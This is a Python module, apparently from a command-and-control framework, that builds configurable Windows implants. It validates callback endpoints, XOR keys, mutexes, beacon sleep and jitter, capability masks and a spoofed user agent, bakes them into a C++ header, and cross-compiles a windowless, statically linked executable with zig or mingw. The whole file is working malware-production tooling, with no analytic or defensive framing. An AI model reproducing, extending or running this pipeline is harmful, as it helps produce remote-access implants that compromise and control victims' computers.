"""Implant build pipeline.

Takes a validated config, renders it into the implant's compile-time header, and
invokes whatever Windows cross toolchain is present. Three outcomes are possible
and all three are real:

  ok           a PE was produced; sha256 and size are recorded
  source_only  no cross toolchain on this host; a source bundle is returned
               instead, buildable with CMake/MSVC on a Windows box
  error        the compiler ran and failed; captured output is stored verbatim

An artifact is never reported as available unless bytes exist on disk.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import threading
import time
from dataclasses import asdict, dataclass, field
from typing import Any

from . import protocol
from .store import Store, new_id, now


@dataclass
class BuildConfig:
    name: str = "luna"
    transport: str = "https"
    endpoints: list[str] = field(default_factory=lambda: ["127.0.0.1:8443"])
    xor_key: str = ""
    mutex: str = ""
    sleep: int = 60
    jitter: int = 20
    capabilities: list[str] = field(default_factory=list)
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    output: str = "luna-implant.exe"

    def to_jsonable(self) -> dict[str, Any]:
        return asdict(self)


LINK_LIBS = [
    "-lws2_32", "-lwinhttp", "-lbcrypt", "-lcrypt32", "-ladvapi32",
    "-lshell32", "-lpsapi", "-luserenv", "-lntdll",
]


@dataclass
class Toolchain:
    kind: str
    cxx: str
    prefix: list[str]
    linker: list[str]

    def command(self, sources: list[str], out_path: str) -> list[str]:
        return [
            self.cxx,
            *self.prefix,
            "-std=c++20",
            "-O2",
            "-DWIN32_LEAN_AND_MEAN",
            "-DUNICODE",
            "-D_UNICODE",
            "-o", out_path,
            *sources,
            *LINK_LIBS,
            *self.linker,
        ]


def _zig_binary() -> str | None:
    found = shutil.which("zig")
    if found:
        return found
    # the operator may have installed ziglang from pypi instead of system-wide
    import sys

    for base in (sys.prefix, sys.base_prefix):
        candidate = os.path.join(
            base, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}",
            "site-packages", "ziglang", "zig",
        )
        if os.path.exists(candidate):
            return candidate
    return None


class Builder:
    def __init__(
        self,
        store: Store,
        source_root: str,
        output_root: str,
        template_path: str,
        cert_fingerprint: str = "",
    ) -> None:
        self.store = store
        self.source_root = os.path.abspath(source_root)
        self.output_root = os.path.abspath(output_root)
        self.template_path = os.path.abspath(template_path)
        self.cert_fingerprint = cert_fingerprint
        self._lock = threading.Lock()
        os.makedirs(self.output_root, exist_ok=True)

    # -- validation -------------------------------------------------------
    def validate(self, payload: dict[str, Any]) -> tuple[BuildConfig, str]:
        cfg = BuildConfig()
        name = str(payload.get("name", cfg.name)).strip() or cfg.name
        if not name.replace("-", "").replace("_", "").isalnum():
            return cfg, "name must be alphanumeric, dash, or underscore"
        cfg.name = name

        transport = str(payload.get("transport", cfg.transport)).lower()
        if transport not in ("https", "tcp"):
            return cfg, "transport must be 'https' or 'tcp'"
        cfg.transport = transport

        endpoints = payload.get("endpoints")
        if isinstance(endpoints, str):
            endpoints = [e for e in endpoints.replace(",", "\n").split() if e]
        if not isinstance(endpoints, list) or not endpoints:
            return cfg, "at least one endpoint is required"
        clean: list[str] = []
        for raw in endpoints[:8]:
            host, _, port = str(raw).strip().partition(":")
            if not host or not port.isdigit():
                return cfg, f"endpoint {raw!r} must be host:port"
            if not (0 < int(port) < 65536):
                return cfg, f"endpoint {raw!r} has an out of range port"
            clean.append(f"{host}:{int(port)}")
        cfg.endpoints = clean

        xor_key = str(payload.get("xor_key", "")).strip()
        if xor_key:
            cleaned = xor_key.replace("0x", "").replace(" ", "").replace(",", "")
            if not cleaned or len(cleaned) % 2:
                return cfg, "xor_key must be an even number of hex digits"
            try:
                bytes.fromhex(cleaned)
            except ValueError:
                return cfg, "xor_key must be hex"
            cfg.xor_key = cleaned.lower()

        mutex = str(payload.get("mutex", "")).strip()
        if mutex and not mutex.isprintable():
            return cfg, "mutex must be printable ASCII"
        cfg.mutex = mutex or f"Global\\{name}-{os.urandom(4).hex()}"

        try:
            cfg.sleep = max(1, min(int(payload.get("sleep", cfg.sleep)), 86400))
            cfg.jitter = max(0, min(int(payload.get("jitter", cfg.jitter)), 90))
        except (TypeError, ValueError):
            return cfg, "sleep and jitter must be integers"

        caps = payload.get("capabilities")
        if caps is None or caps == "all" or caps == ["all"]:
            cfg.capabilities = sorted(protocol.TASK_KINDS)
        elif isinstance(caps, list):
            bad = [c for c in caps if c not in protocol.TASK_KINDS]
            if bad:
                return cfg, f"unknown capabilities: {', '.join(map(str, bad))}"
            cfg.capabilities = list(dict.fromkeys(caps))
        else:
            return cfg, "capabilities must be a list or 'all'"
        if not cfg.capabilities:
            return cfg, "at least one capability is required"

        cfg.user_agent = str(payload.get("user_agent", cfg.user_agent))[:200]
        out = str(payload.get("output", "")).strip()
        if out and not out.lower().endswith(".exe"):
            out += ".exe"
        cfg.output = out or f"{name}.exe"
        return cfg, ""

    # -- submit -----------------------------------------------------------
    def submit(self, cfg: BuildConfig) -> dict[str, Any]:
        build_id = new_id("b")
        reg_key = os.urandom(32).hex()
        self.store.execute(
            "INSERT INTO builds (id, config_json, reg_key, status, created_at) "
            "VALUES (%s, %s, %s, 'running', %s)",
            (build_id, json.dumps(cfg.to_jsonable()), reg_key, now()),
        )
        threading.Thread(
            target=self._run, args=(build_id, cfg, reg_key), daemon=True
        ).start()
        return {
            "id": build_id,
            "status": "running",
            "config": cfg.to_jsonable(),
            "reg_key": reg_key,
            "artifact": f"/api/builds/{build_id}/artifact",
        }

    def _fail(self, build_id: str, message: str) -> None:
        self.store.execute(
            "UPDATE builds SET status = 'error', message = %s, finished_at = %s "
            "WHERE id = %s",
            (message[:8000], now(), build_id),
        )
        self.store.log_event("build", f"build {build_id} failed: {message[:200]}")

    # -- execution --------------------------------------------------------
    def _run(self, build_id: str, cfg: BuildConfig, reg_key: str) -> None:
        workdir = os.path.join(self.output_root, build_id)
        try:
            os.makedirs(workdir, exist_ok=True)
            header = self._render_header(cfg, build_id, reg_key)
            source_dir = os.path.join(workdir, "src")
            if os.path.isdir(source_dir):
                shutil.rmtree(source_dir)
            shutil.copytree(
                self.source_root,
                source_dir,
                ignore=shutil.ignore_patterns("*.o", "*.obj", "build", ".git"),
            )
            with open(os.path.join(source_dir, "luna_config.hpp"), "w") as fh:
                fh.write(header)

            toolchain = self._detect_toolchain()
            if toolchain is None:
                self._emit_source_bundle(build_id, workdir, cfg)
                return

            out_path = os.path.join(workdir, cfg.output)
            sources = sorted(
                os.path.join(source_dir, f)
                for f in os.listdir(source_dir)
                if f.endswith(".cpp")
            )
            if not sources:
                self._fail(build_id, "no implant sources found")
                return
            cmd = toolchain.command(sources, out_path)
            started = time.time()
            proc = subprocess.run(
                cmd, cwd=workdir, capture_output=True, text=True, timeout=1800
            )
            if proc.returncode != 0 or not os.path.exists(out_path):
                detail = (proc.stderr or proc.stdout or "compiler produced no output")
                self._fail(
                    build_id,
                    f"{os.path.basename(toolchain.cxx)} ({toolchain.kind}) "
                    f"exited {proc.returncode}\n{detail[-4000:]}",
                )
                return

            digest = hashlib.sha256()
            with open(out_path, "rb") as fh:
                for chunk in iter(lambda: fh.read(1 << 20), b""):
                    digest.update(chunk)
            size = os.path.getsize(out_path)
            elapsed = time.time() - started
            self.store.execute(
                "UPDATE builds SET status = 'ok', message = %s, artifact_path = %s, "
                "sha256 = %s, size = %s, finished_at = %s WHERE id = %s",
                (
                    f"compiled with {toolchain.kind} in {elapsed:.1f}s; "
                    f"sha256 {digest.hexdigest()}",
                    out_path,
                    digest.hexdigest(),
                    size,
                    now(),
                    build_id,
                ),
            )
            self.store.log_event("build", f"build {build_id} ok ({size} bytes)")
        except Exception as exc:  # noqa: BLE001
            self._fail(build_id, f"{type(exc).__name__}: {exc}")

    def _emit_source_bundle(self, build_id: str, workdir: str, cfg: BuildConfig) -> None:
        base = os.path.join(workdir, "src")
        bundle = os.path.join(self.output_root, f"{build_id}-source")
        shutil.make_archive(bundle, "zip", base)
        bundle += ".zip"
        self.store.execute(
            "UPDATE builds SET status = 'source_only', message = %s, "
            "artifact_path = %s, size = %s, finished_at = %s WHERE id = %s",
            (
                "no Windows cross toolchain on this host; source bundle emitted "
                "with luna_config.hpp baked in. Build with: cmake -B build "
                "-G \"Visual Studio 17 2022\" -A x64 && cmake --build build --config Release",
                bundle,
                os.path.getsize(bundle),
                now(),
                build_id,
            ),
        )
        self.store.log_event("build", f"build {build_id} emitted source bundle")

    def _detect_toolchain(self) -> Toolchain | None:
        zig = _zig_binary()
        if zig:
            return Toolchain(
                kind="zig-mingw",
                cxx=zig,
                prefix=["c++", "-target", "x86_64-windows-gnu"],
                linker=["-Wl,--subsystem,windows"],
            )
        for name in ("x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-clang++"):
            found = shutil.which(name)
            if found:
                return Toolchain(
                    kind=name.split("-")[0] + "-mingw",
                    cxx=found,
                    prefix=[],
                    linker=["-static", "-static-libgcc", "-static-libstdc++", "-mwindows"],
                )
        return None

    def _render_header(self, cfg: BuildConfig, build_id: str, reg_key: str) -> str:
        with open(self.template_path, "r", encoding="utf-8") as fh:
            template = fh.read()
        endpoint_list = ", ".join(f'L"{e}"' for e in cfg.endpoints)
        cap_mask = protocol.capabilities_for(cfg.capabilities)
        xor_bytes = ",".join(
            f"0x{cfg.xor_key[i:i + 2]}" for i in range(0, len(cfg.xor_key), 2)
        ) or "0x00"
        replacements = {
            "@BUILD_ID@": build_id,
            "@IMPLANT_NAME@": cfg.name,
            "@TRANSPORT@": cfg.transport,
            "@ENDPOINTS@": endpoint_list,
            "@ENDPOINT_COUNT@": str(len(cfg.endpoints)),
            "@XOR_KEY@": xor_bytes,
            "@MUTEX@": cfg.mutex.replace("\\", "\\\\"),
            "@SLEEP@": str(cfg.sleep),
            "@JITTER@": str(cfg.jitter),
            "@REG_KEY@": reg_key,
            "@CAP_MASK@": f"0x{cap_mask:08X}",
            "@USER_AGENT@": cfg.user_agent,
            "@CERT_FP@": self.cert_fingerprint,
            "@PROTO_VERSION@": str(protocol.PROTO),
        }
        for key, value in replacements.items():
            template = template.replace(key, value)
        return template
